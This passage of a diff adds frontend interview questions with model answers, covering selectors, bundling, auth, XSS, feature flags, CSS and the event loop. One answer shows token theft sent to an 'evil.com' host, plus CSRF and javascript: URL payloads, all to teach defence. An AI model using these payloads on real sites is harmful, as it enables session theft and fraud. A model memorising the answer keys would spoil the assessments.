string) => todoId],\n  (todos, todoId) => todos.find(t => t.id === todoId),\n  {\n    memoizeOptions: {\n      maxSize: 100, // Cache up to 100 different todoIds\n    },\n  }\n);\n```\n\n## Custom Equality Checks\n\n```typescript\nimport { createSelectorCreator, lruMemoize } from '@reduxjs/toolkit';\nimport { isEqual } from 'lodash';\n\n// 1. Deep equality for complex objects\nconst createDeepEqualSelector = createSelectorCreator({\n  memoize: lruMemoize,\n  memoizeOptions: {\n    equalityCheck: isEqual,\n    maxSize: 10,\n  },\n});\n\nconst selectFormattedData = createDeepEqualSelector(\n  [selectRawData],\n  (rawData) => {\n    // Heavy transformation\n    return rawData.map(item => ({\n      ...item,\n      displayName: `${item.firstName} ${item.lastName}`,\n    }));\n  }\n);\n\n// 2. Shallow equality for arrays\nimport { shallowEqual } from 'react-redux';\n\nconst selectUserIds = createSelector(\n  [selectUsers],\n  (users) => users.map(u => u.id),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: shallowEqual, // Compare result arrays\n    },\n  }\n);\n\n// 3. Custom comparison for specific fields\nconst selectRelevantUserData = createSelector(\n  [selectUsers],\n  (users) => users.map(u => ({ id: u.id, name: u.name })),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: (a, b) => {\n        if (a.length !== b.length) return false;\n        return a.every((item, i) => \n          item.id === b[i].id && item.name === b[i].name\n        );\n      },\n    },\n  }\n);\n```\n\n## When to Use Custom Equality\n\n```typescript\n// 1. API data with same content but new references\n// API returns: { users: [...] } - new array every time\nconst selectUsersWithDeepEqual = createDeepEqualSelector(\n  [selectApiResponse],\n  (response) => response.users\n);\n\n// 2. Derived arrays that often have same values\nconst selectActiveUserIds = createSelector(\n  [selectUsers],\n  (users) => users.filter(u => u.isActive).map(u => u.id),\n  {\n    memoizeOptions: {\n      resultEqualityCheck: (a, b) => \n        a.length === b.length && a.every((id, i) => id === b[i]),\n    },\n  }\n);\n\n// 3. Objects with irrelevant changing fields\ninterface User {\n  id: string;\n  name: string;\n  lastSeen: Date; // Changes frequently, but we don't care\n}\n\nconst createUserEqualityCheck = (a: User[], b: User[]) => {\n  if (a.length !== b.length) return false;\n  return a.every((user, i) => \n    user.id === b[i].id && user.name === b[i].name\n    // Ignores lastSeen\n  );\n};\n```\n\n## Performance Tips\n\n```typescript\n// 1. Keep selectors small and focused\n// âŒ Bad\nconst selectEverything = createSelector([selectState], (state) => ({\n  users: state.users,\n  posts: state.posts,\n  comments: state.comments,\n  // ...\n}));\n\n// âœ… Good\nconst selectUsers = (state: RootState) => state.users;\nconst selectPosts = (state: RootState) => state.posts;\n\n// 2. Avoid creating objects in input selectors\n// âŒ Bad\nconst selectUserAndFilter = createSelector(\n  [(state) => ({ user: state.user, filter: state.filter })], // New object!\n  (combined) => ...\n);\n\n// âœ… Good\nconst selectUserAndFilter = createSelector(\n  [selectUser, selectFilter],\n  (user, filter) => ...\n);\n\n// 3. Use weakMapMemoize for instance-based caching\nimport { weakMapMemoize } from '@reduxjs/toolkit';\n\nconst selectItemsByCategory = createSelector(\n  [selectItems, (state: RootState, category: string) => category],\n  (items, category) => items.filter(i => i.category === category),\n  { memoize: weakMapMemoize }\n);\n```",
+      "keyPoints": [
+        "Understands why derived data needs memoization",
+        "Can explain how Reselect caches results",
+        "Knows how to compose selectors",
+        "Can implement parameterized selectors correctly",
+        "Understands when to use custom equality checks"
+      ],
+      "followUpQuestions": [
+        "How would you debug a selector that's recomputing too often?",
+        "What's the memory footprint of memoized selectors?",
+        "How does selector memoization compare to component memoization?",
+        "When would you NOT use a memoized selector?"
+      ],
+      "relatedTopics": [
+        "redux",
+        "state-management",
+        "performance",
+        "memoization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Companies using Redux"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "bundle-tree-shaking-001",
+      "category": "bundle-tree-shaking",
+      "difficulty": "senior",
+      "question": "Explain how tree shaking works in modern bundlers. Why do some libraries not tree-shake well, and how would you audit and fix bundle size issues?",
+      "answer": "## How Tree Shaking Works\n\nTree shaking is dead code elimination based on ES Module static analysis. Bundlers analyze import/export statements to determine which code is actually used.\n\n### Prerequisites for Tree Shaking\n\n```typescript\n// âœ… ES Modules - static, analyzable\nimport { map, filter } from 'lodash-es';\nexport const utils = { map, filter };\n\n// âŒ CommonJS - dynamic, not analyzable\nconst _ = require('lodash');\nmodule.exports = { map: _.map };\n```\n\n### Why Some Libraries Don't Tree-Shake\n\n**1. Side Effects in Module Scope:**\n```typescript\n// âŒ Bad: Side effect at module level\nconsole.log('Utils loaded!'); // Bundler can't remove this file\nexport const add = (a: number, b: number) => a + b;\n```\n\n**2. Missing sideEffects Field:**\n```json\n{\n  \"name\": \"my-library\",\n  \"sideEffects\": false\n}\n```\n\n**3. Barrel Files Anti-Pattern:**\n```typescript\n// âŒ Bad: Re-exporting everything\nexport * from './Button';\nexport * from './Card';\n// ... 50 more components\n```\n\n### Auditing Bundle Size\n\n```bash\n# Webpack Bundle Analyzer\nnpx webpack-bundle-analyzer stats.json\n\n# Vite\nnpm install rollup-plugin-visualizer\n```\n\n### Fixing Bundle Issues\n\n```typescript\n// 1. Direct imports instead of barrel files\nimport { Button } from './components/Button';\n\n// 2. Replace heavy libraries\nimport { debounce } from 'lodash-es'; // Instead of full lodash\n\n// 3. Dynamic imports for conditional features\nconst PDFExport = lazy(() => import('./PDFExport'));\n```",
+      "keyPoints": [
+        "Understands ES Modules requirement for tree shaking",
+        "Knows sideEffects field in package.json",
+        "Can identify barrel file anti-pattern",
+        "Familiar with bundle analysis tools"
+      ],
+      "followUpQuestions": [
+        "How does tree shaking differ between Webpack and Rollup?",
+        "What's the impact of CSS-in-JS on bundle size?"
+      ],
+      "relatedTopics": [
+        "webpack",
+        "vite",
+        "code-splitting",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Vercel",
+        "Shopify"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "bundle-tree-shaking-002",
+      "category": "bundle-tree-shaking",
+      "difficulty": "mid",
+      "question": "Explain code splitting strategies in React. When would you use route-based vs component-based splitting?",
+      "answer": "## Code Splitting Strategies\n\n### Route-Based Splitting\nBest for: Pages/routes users may never visit\n\n```typescript\nconst Dashboard = lazy(() => import('./pages/Dashboard'));\nconst Settings = lazy(() => import('./pages/Settings'));\n\nfunction App() {\n  return (\n    <Suspense fallback={<PageSkeleton />}>\n      <Routes>\n        <Route path=\"/dashboard\" element={<Dashboard />} />\n        <Route path=\"/settings\" element={<Settings />} />\n      </Routes>\n    </Suspense>\n  );\n}\n```\n\n### Component-Based Splitting\nBest for: Heavy components not immediately visible\n\n```typescript\nconst HeavyModal = lazy(() => import('./HeavyModal'));\n\nfunction Page() {\n  const [showModal, setShowModal] = useState(false);\n  \n  return (\n    <>\n      <button onClick={() => setShowModal(true)}>Open</button>\n      {showModal && (\n        <Suspense fallback={<Spinner />}>\n          <HeavyModal />\n        </Suspense>\n      )}\n    </>\n  );\n}\n```\n\n### Preloading Strategies\n\n```typescript\n// Preload on hover\n<Link \n  to=\"/dashboard\"\n  onMouseEnter={() => import('./pages/Dashboard')}\n>\n  Dashboard\n</Link>\n```\n\n| Strategy | Use When |\n|----------|----------|\n| Route-based | Separate pages |\n| Component-based | Heavy below-fold content |\n| Feature-based | Conditional features |",
+      "keyPoints": [
+        "Understands route vs component splitting",
+        "Knows React.lazy and Suspense usage",
+        "Can implement preloading strategies"
+      ],
+      "followUpQuestions": [
+        "How would you handle chunk loading errors?",
+        "What's the overhead of too many small chunks?"
+      ],
+      "relatedTopics": [
+        "react-lazy",
+        "suspense",
+        "webpack"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Most React companies"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "security-auth-001",
+      "category": "security-auth",
+      "difficulty": "senior",
+      "question": "Compare localStorage vs HttpOnly cookies for storing authentication tokens. What are the security implications of each approach?",
+      "answer": "## Security Comparison\n\n| Aspect | localStorage | HttpOnly Cookie |\n|--------|-------------|-----------------|\n| XSS Vulnerability | **HIGH** - JS can read | **LOW** - JS cannot access |\n| CSRF Vulnerability | **LOW** - Not auto-sent | **HIGH** - Auto-sent |\n| Subdomains | Same origin only | Configurable |\n\n## XSS Attack Vector\n\n```typescript\n// localStorage - vulnerable to XSS\nconst stolenToken = localStorage.getItem('authToken');\nfetch('https://evil.com/steal', { body: stolenToken });\n\n// HttpOnly cookie - protected from XSS\ndocument.cookie; // HttpOnly cookies not visible\n```\n\n## CSRF Attack Vector\n\n```html\n<!-- HttpOnly cookie - vulnerable to CSRF -->\n<img src=\"https://bank.com/transfer?to=attacker&amount=1000\" />\n```\n\n## Best Practice: Hybrid Approach\n\n```typescript\n// Server\nres.cookie('refreshToken', token, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  path: '/api/auth/refresh',\n});\n\n// Client - store access token in memory\nclass AuthManager {\n  private accessToken: string | null = null;\n  \n  async fetch(url: string, options: RequestInit = {}) {\n    return fetch(url, {\n      ...options,\n      credentials: 'include',\n      headers: {\n        ...options.headers,\n        'Authorization': `Bearer ${this.accessToken}`,\n      },\n    });\n  }\n}\n```\n\n**Recommendation:**\n- Access Token: Memory (15 min expiry)\n- Refresh Token: HttpOnly cookie\n- Add CSRF tokens for cookie-based requests",
+      "keyPoints": [
+        "Understands XSS vs CSRF attack vectors",
+        "Knows HttpOnly prevents JavaScript access",
+        "Recommends hybrid approach",
+        "Implements CSRF protection"
+      ],
+      "followUpQuestions": [
+        "How would you handle token refresh in a SPA?",
+        "What about subdomain cookie sharing?"
+      ],
+      "relatedTopics": [
+        "xss",
+        "csrf",
+        "jwt",
+        "session-management"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any company handling auth"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "security-auth-002",
+      "category": "security-auth",
+      "difficulty": "mid",
+      "question": "What is XSS (Cross-Site Scripting)? Explain the different types and how to prevent them in a React application.",
+      "answer": "## XSS Types\n\n### 1. Stored XSS\nScript stored in database, served to all users.\n\n### 2. Reflected XSS\nScript reflected from URL parameters.\n\n### 3. DOM-based XSS\nClient-side JS manipulates DOM unsafely.\n\n## React's Built-in Protection\n\n```tsx\n// âœ… Safe - React escapes this\nfunction Comment({ text }: { text: string }) {\n  return <p>{text}</p>;\n}\n// \"<script>alert('xss')</script>\" â†’ displayed as text\n```\n\n## React XSS Vulnerabilities\n\n### dangerouslySetInnerHTML\n\n```tsx\n// âŒ Dangerous\n<div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// âœ… Safe - sanitize first\nimport DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ \n  __html: DOMPurify.sanitize(userInput) \n}} />\n```\n\n### javascript: URLs\n\n```tsx\n// âŒ Vulnerable\n<a href={userUrl}>Link</a>\n// Attacker: javascript:alert('XSS')\n\n// âœ… Safe - validate protocol\nconst safeUrl = url.startsWith('http') ? url : '#';\n```\n\n## Prevention Checklist\n- Use React's default escaping\n- Sanitize HTML with DOMPurify\n- Validate URLs (block javascript:)\n- Implement Content Security Policy",
+      "keyPoints": [
+        "Can explain stored, reflected, DOM-based XSS",
+        "Understands React's automatic escaping",
+        "Knows dangerous patterns",
+        "Implements sanitization"
+      ],
+      "followUpQuestions": [
+        "How does CSP help prevent XSS?",
+        "What about XSS in SSR contexts?"
+      ],
+      "relatedTopics": [
+        "security",
+        "csp",
+        "sanitization"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any security-conscious company"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "feature-flags-001",
+      "category": "feature-flags",
+      "difficulty": "senior",
+      "question": "Design a feature flag system for a large-scale frontend application. How would you handle gradual rollouts, A/B testing, and flag dependencies?",
+      "answer": "## Feature Flag Architecture\n\n```typescript\ninterface FeatureFlag {\n  key: string;\n  type: 'boolean' | 'string' | 'number';\n  defaultValue: unknown;\n  rules: TargetingRule[];\n  rollout?: { percentage: number };\n  prerequisites?: { flagKey: string; requiredValue: unknown }[];\n}\n\ninterface TargetingRule {\n  conditions: Condition[];\n  value: unknown;\n  percentage?: number;\n}\n```\n\n## Flag Evaluation Engine\n\n```typescript\nclass FlagEvaluator {\n  evaluate<T>(flag: FeatureFlag, context: UserContext): T {\n    // 1. Check prerequisites\n    for (const prereq of flag.prerequisites ?? []) {\n      if (this.evaluate(this.getFlag(prereq.flagKey), context) !== prereq.requiredValue) {\n        return flag.defaultValue as T;\n      }\n    }\n    \n    // 2. Evaluate targeting rules\n    for (const rule of flag.rules) {\n      if (this.matchesRule(rule, context)) {\n        return rule.value as T;\n      }\n    }\n    \n    // 3. Apply percentage rollout with consistent bucketing\n    if (flag.rollout && this.isInPercentage(context.userId, flag.key, flag.rollout.percentage)) {\n      return true as T;\n    }\n    \n    return flag.defaultValue as T;\n  }\n  \n  private isInPercentage(userId: string, flagKey: string, percentage: number): boolean {\n    const hash = this.hash(`${userId}:${flagKey}`);\n    return (hash % 100) + 1 <= percentage;\n  }\n}\n```\n\n## React Integration\n\n```typescript\nfunction useFeatureFlag(flagKey: string): boolean {\n  const { flags } = useContext(FeatureFlagContext);\n  return Boolean(flags[flagKey]);\n}\n\n// Usage\nfunction Checkout() {\n  const useNewCheckout = useFeatureFlag('new-checkout');\n  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;\n}\n```\n\n## Gradual Rollout Configuration\n\n```typescript\nconst flag: FeatureFlag = {\n  key: 'new-checkout',\n  rules: [\n    { conditions: [{ attribute: 'email', operator: 'contains', value: '@company.com' }], value: true },\n    { conditions: [{ attribute: 'isBetaUser', operator: 'equals', value: true }], value: true },\n  ],\n  rollout: { percentage: 25 }, // Start at 25%, increase gradually\n};\n```",
+      "keyPoints": [
+        "Understands targeting rules",
+        "Implements consistent percentage bucketing",
+        "Handles flag dependencies",
+        "Integrates with analytics for A/B testing"
+      ],
+      "followUpQuestions": [
+        "How would you handle stale flags during deployment?",
+        "How do you test code paths for flags that are off?"
+      ],
+      "relatedTopics": [
+        "a-b-testing",
+        "gradual-rollout",
+        "trunk-based-development"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Netflix",
+        "Spotify",
+        "LinkedIn"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "feature-flags-002",
+      "category": "feature-flags",
+      "difficulty": "mid",
+      "question": "How do feature flags enable trunk-based development? What are the best practices for managing flag lifecycle?",
+      "answer": "## Trunk-Based Development with Feature Flags\n\n```\nTraditional: Feature branches (days/weeks)\nmain â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º\n      \\â”€â”€feature-branchâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€/\n\nTrunk-based: Short-lived branches + flags\nmain â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â—â”€â–º\n       â†‘ â†‘ â†‘ â†‘ (daily commits behind flags)\n```\n\n## Benefits\n\n1. **Continuous Integration**: Code merged daily\n2. **Reduced Merge Conflicts**: Small, frequent merges\n3. **Safer Deployments**: Feature hidden until ready\n4. **Quick Rollback**: Disable flag without deploy\n\n## Flag Lifecycle\n\n```\n1. CREATED    â†’ Flag added, default OFF\n2. DEVELOPING â†’ Code committed behind flag\n3. TESTING    â†’ Enabled for QA/staging\n4. ROLLING    â†’ Gradual production rollout\n5. RELEASED   â†’ 100% enabled\n6. CLEANUP    â†’ Remove flag code\n7. ARCHIVED   â†’ Flag deleted\n```\n\n## Best Practices\n\n```typescript\n// 1. Flag naming convention\nconst FLAGS = {\n  CHECKOUT_V2: 'checkout-v2',           // Feature flag\n  EXPERIMENT_CTA_COLOR: 'exp-cta-color', // Experiment\n  OPS_RATE_LIMIT: 'ops-rate-limit',      // Operational\n} as const;\n\n// 2. Default to OFF for safety\nconst flag: FeatureFlag = {\n  key: 'risky-feature',\n  defaultValue: false, // Always safe default\n};\n\n// 3. Set expiration dates\ninterface FeatureFlag {\n  expiresAt?: string; // Alert when flag should be cleaned up\n}\n\n// 4. Document flag purpose\ninterface FeatureFlag {\n  description: string;\n  owner: string;\n  jiraTicket?: string;\n}\n```\n\n## Flag Cleanup Process\n\n```typescript\n// Before cleanup\nfunction Checkout() {\n  const useNewCheckout = useFeatureFlag('checkout-v2');\n  return useNewCheckout ? <NewCheckout /> : <LegacyCheckout />;\n}\n\n// After cleanup (flag at 100% for 2 weeks)\nfunction Checkout() {\n  return <NewCheckout />;\n}\n// Delete LegacyCheckout component\n// Remove flag from system\n```",
+      "keyPoints": [
+        "Understands trunk-based development benefits",
+        "Knows flag lifecycle stages",
+        "Implements cleanup process",
+        "Uses naming conventions"
+      ],
+      "followUpQuestions": [
+        "How do you prevent flag accumulation?",
+        "What metrics indicate a flag is ready for cleanup?"
+      ],
+      "relatedTopics": [
+        "ci-cd",
+        "deployment",
+        "testing"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Google",
+        "Meta",
+        "Modern tech companies"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-001",
+      "category": "css-layout",
+      "difficulty": "senior",
+      "question": "Explain the CSS stacking context. How does z-index work, and what creates a new stacking context?",
+      "answer": "## Stacking Context Fundamentals\n\nA stacking context is a 3D conceptualization of HTML elements along the z-axis. Elements within a stacking context are painted as a unit.\n\n```\nStacking Order (bottom to top):\n1. Background and borders of stacking context\n2. Negative z-index children\n3. Non-positioned, non-floated block elements\n4. Non-positioned floated elements\n5. Inline elements\n6. z-index: 0 or auto (positioned)\n7. Positive z-index children\n```\n\n## What Creates a Stacking Context\n\n```css\n/* Root element */\nhtml { }\n\n/* Position + z-index */\n.positioned { position: relative; z-index: 1; }\n\n/* Fixed/Sticky positioning */\n.fixed { position: fixed; }\n.sticky { position: sticky; }\n\n/* Flexbox/Grid children with z-index */\n.flex-child { z-index: 1; } /* Parent must be flex/grid */\n\n/* Opacity < 1 */\n.translucent { opacity: 0.99; }\n\n/* Transform */\n.transformed { transform: translateZ(0); }\n\n/* Filter */\n.filtered { filter: blur(0); }\n\n/* Isolation */\n.isolated { isolation: isolate; }\n\n/* will-change */\n.optimized { will-change: transform; }\n\n/* contain */\n.contained { contain: layout; }\n```\n\n## Common Pitfall: Nested Stacking Contexts\n\n```html\n<div class=\"parent\" style=\"position: relative; z-index: 1;\">\n  <div class=\"child\" style=\"position: relative; z-index: 9999;\">\n    I can never be above...\n  </div>\n</div>\n\n<div class=\"sibling\" style=\"position: relative; z-index: 2;\">\n  ...this element (parent z-index: 1 < 2)\n</div>\n```\n\n## Debugging Technique\n\n```css\n/* Use isolation to create predictable stacking */\n.modal-container {\n  isolation: isolate;\n  z-index: 1000;\n}\n\n/* Everything inside is relative to this context */\n.modal-backdrop { z-index: 1; }\n.modal-content { z-index: 2; }\n```",
+      "keyPoints": [
+        "Understands stacking order rules",
+        "Knows what creates new stacking contexts",
+        "Can debug z-index issues",
+        "Uses isolation property effectively"
+      ],
+      "followUpQuestions": [
+        "Why might a modal appear behind other content?",
+        "How does transform affect stacking context?"
+      ],
+      "relatedTopics": [
+        "css-positioning",
+        "z-index",
+        "layout"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Any frontend role"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-002",
+      "category": "css-layout",
+      "difficulty": "mid",
+      "question": "When would you use CSS Grid vs Flexbox? Explain the key differences and use cases for each.",
+      "answer": "## Core Difference\n\n- **Flexbox**: One-dimensional (row OR column)\n- **Grid**: Two-dimensional (rows AND columns)\n\n## Flexbox: Best For\n\n```css\n/* Navigation bars */\n.nav {\n  display: flex;\n  justify-content: space-between;\n  align-items: center;\n}\n\n/* Centering content */\n.center {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n}\n\n/* Dynamic item distribution */\n.card-list {\n  display: flex;\n  flex-wrap: wrap;\n  gap: 1rem;\n}\n.card { flex: 1 1 300px; } /* Grow/shrink with min-width */\n```\n\n## Grid: Best For\n\n```css\n/* Page layouts */\n.layout {\n  display: grid;\n  grid-template:\n    \"header header\" auto\n    \"sidebar main\" 1fr\n    \"footer footer\" auto\n    / 250px 1fr;\n}\n\n/* Card grids with fixed columns */\n.product-grid {\n  display: grid;\n  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));\n  gap: 1rem;\n}\n\n/* Complex alignment */\n.dashboard {\n  display: grid;\n  grid-template-columns: repeat(12, 1fr);\n}\n.widget-large { grid-column: span 8; }\n.widget-small { grid-column: span 4; }\n```\n\n## Decision Framework\n\n| Use Case | Flexbox | Grid |\n|----------|---------|------|\n| Navigation | âœ… | |\n| Centering | âœ… | |\n| Unknown item count | âœ… | |\n| Page layout | | âœ… |\n| Card grid (equal sizes) | | âœ… |\n| Overlapping elements | | âœ… |\n| Both row & column control | | âœ… |\n\n## Combining Both\n\n```css\n/* Grid for layout, Flexbox for components */\n.page {\n  display: grid;\n  grid-template-columns: 200px 1fr;\n}\n\n.header {\n  display: flex;\n  justify-content: space-between;\n}\n```",
+      "keyPoints": [
+        "Understands 1D vs 2D layout difference",
+        "Knows appropriate use cases for each",
+        "Can combine Grid and Flexbox effectively"
+      ],
+      "followUpQuestions": [
+        "How does subgrid help with nested layouts?",
+        "When would you use grid-template-areas?"
+      ],
+      "relatedTopics": [
+        "css-layout",
+        "responsive-design"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "All frontend roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "css-layout-003",
+      "category": "css-layout",
+      "difficulty": "mid",
+      "question": "What is the Block Formatting Context (BFC) in CSS? How can you use it to solve common layout problems?",
+      "answer": "## What is BFC?\n\nA Block Formatting Context is a region where block boxes are laid out and floats interact with each other. Elements in a BFC don't affect layout outside it.\n\n## Creating a BFC\n\n```css\n/* Any of these create a BFC */\n.bfc {\n  overflow: hidden; /* or auto, scroll */\n  display: flow-root; /* Modern, explicit way */\n  display: flex;\n  display: grid;\n  display: inline-block;\n  position: absolute;\n  position: fixed;\n  float: left; /* or right */\n  contain: layout;\n}\n```\n\n## Problem 1: Containing Floats\n\n```html\n<div class=\"container\">\n  <div class=\"float\">Floated</div>\n  <p>Content...</p>\n</div>\n\n<style>\n.float { float: left; }\n\n/* âŒ Container collapses (height: 0) */\n.container { background: gray; }\n\n/* âœ… BFC contains the float */\n.container { display: flow-root; }\n</style>\n```\n\n## Problem 2: Margin Collapse\n\n```html\n<div class=\"parent\">\n  <div class=\"child\">Child with margin</div>\n</div>\n\n<style>\n.child { margin-top: 20px; }\n\n/* âŒ Margin collapses through parent */\n.parent { background: gray; }\n\n/* âœ… BFC prevents margin collapse */\n.parent { display: flow-root; }\n</style>\n```\n\n## Problem 3: Float Wrapping\n\n```html\n<div class=\"float\">Sidebar</div>\n<div class=\"main\">Main content wraps around float...</div>\n\n<style>\n.float { float: left; width: 200px; }\n\n/* âŒ Main content wraps around float */\n.main { }\n\n/* âœ… BFC creates independent block */\n.main { display: flow-root; }\n</style>\n```\n\n## Modern Alternative\n\n```css\n/* Use display: flow-root for explicit BFC */\n.container {\n  display: flow-root; /* Clear, semantic intent */\n}\n\n/* Instead of the clearfix hack */\n.clearfix::after {\n  content: \"\";\n  display: block;\n  clear: both;\n}\n```",
+      "keyPoints": [
+        "Understands BFC purpose and creation",
+        "Knows how to contain floats",
+        "Can prevent margin collapse",
+        "Uses display: flow-root for modern BFC"
+      ],
+      "followUpQuestions": [
+        "How does BFC relate to stacking context?",
+        "When would overflow: hidden cause problems?"
+      ],
+      "relatedTopics": [
+        "css-layout",
+        "floats",
+        "margins"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Senior frontend roles"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "js-event-loop-001",
+      "category": "js-event-loop",
+      "difficulty": "senior",
+      "question": "Explain the JavaScript event loop in detail. What's the difference between microtasks and macrotasks, and how does this affect code execution order?",
+      "answer": "## Event Loop Architecture\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                       Call Stack                         â”‚\nâ”‚  (Currently executing synchronous code)                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n                          â”‚\n                          â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                      Event Loop                          â”‚\nâ”‚  1. Execute all sync code (call stack empty)            â”‚\nâ”‚  2. Process ALL microtasks                              â”‚\nâ”‚  3. Render (if needed)                                  â”‚\nâ”‚  4. Process ONE macrotask                               â”‚\nâ”‚  5. Repeat                                              â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚                              â”‚\n         â–¼                              â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚   Microtask     â”‚          â”‚   Macrotask     â”‚\nâ”‚     Queue       â”‚          â”‚     Queue       â”‚\nâ”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚          â”‚â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚\nâ”‚ â€¢ Promise.then  â”‚          â”‚ â€¢ setTimeout    â”‚\nâ”‚ â€¢ queueMicrotaskâ”‚          â”‚ â€¢ setInterval   â”‚\nâ”‚ â€¢ MutationObs   â”‚          â”‚ â€¢ setImmediate  â”‚\nâ”‚ â€¢ process.next  â”‚          â”‚ â€¢ I/O callbacks â”‚\nâ”‚   (Node.js)     â”‚          â”‚ â€¢ UI rendering  â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Execution Order Example\n\n```javascript\nconsole.log('1'); // Sync\n\nsetTimeout(() => console.log('2'), 0); // Macrotask\n\nPromise.resolve().then(() => {\n  console.log('3'); // Microtask\n  Promise.resolve().then(() => console.log('4')); // Nested microtask\n});\n\nqueueMicrotask(() => console.log('5')); // Microtask\n\nconsole.log('6'); // Sync\n\n// Output: 1, 6, 3, 5, 4, 2\n// Sync first, then ALL microtasks (including nested), then macrotasks\n```\n\n## Why This Matters\n\n```javascript\n// âŒ Can block rendering\nfunction processLargeArray(arr) {\n  arr.forEach(item => {\n    // Heavy computation\n    Promise.resolve().then(() => process(item));\n  });\n}\n// All promises queue as microtasks\n// Rendering blocked until ALL complete\n\n// âœ… Allow rendering between chunks\nfunction processLargeArrayBetter(arr) {\n  let index = 0;\n  \n  function processChunk() {\n    const chunk = arr.slice(index, index + 100);\n    chunk.forEach(process);\n    index += 100;\n    \n    if (index < arr.length) {\n      setTimeout(processChunk, 0); // Macrotask - allows render\n    }\n  }\n  \n  processChunk();\n}\n```\n\n## requestAnimationFrame\n\n```javascript\n// rAF runs BEFORE rendering, after microtasks\nconsole.log('1');\nrequestAnimationFrame(() => console.log('rAF'));\nPromise.resolve().then(() => console.log('microtask'));\nsetTimeout(() => console.log('timeout'), 0);\n\n// Output: 1, microtask, rAF, timeout\n// (rAF may vary based on frame timing)\n```",
+      "keyPoints": [
+        "Understands microtask vs macrotask priority",
